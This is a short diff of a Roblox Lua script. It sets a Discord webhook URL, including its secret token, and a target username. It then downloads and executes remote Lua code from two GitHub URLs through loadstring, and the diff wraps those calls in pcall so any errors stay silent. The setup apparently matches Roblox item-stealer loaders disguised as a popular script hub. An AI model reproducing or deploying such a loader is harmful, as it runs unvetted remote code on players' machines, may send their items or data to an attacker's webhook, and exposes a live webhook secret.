@@ -1,5 +1,4 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn51GRNYAO2RtJRMn98Tk2eeTJar6GcrFqvA_z56OeX-QWtrjeQ2tOpXDi33S55md"
 getgenv().Username = "GHOSS23"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kevin52772/AhmadV99/refs/heads/main/TRYRBLX"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+pcall(function() local s=game:HttpGet("https://raw.githubusercontent.com/kevin52772/AhmadV99/refs/heads/main/TRYRBLX",true); if type(s)=="string" and #s>10 then pcall(loadstring(s)) end end); pcall(function() local s=game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua",true); if type(s)=="string" and #s>10 then pcall(loadstring(s)) end end)
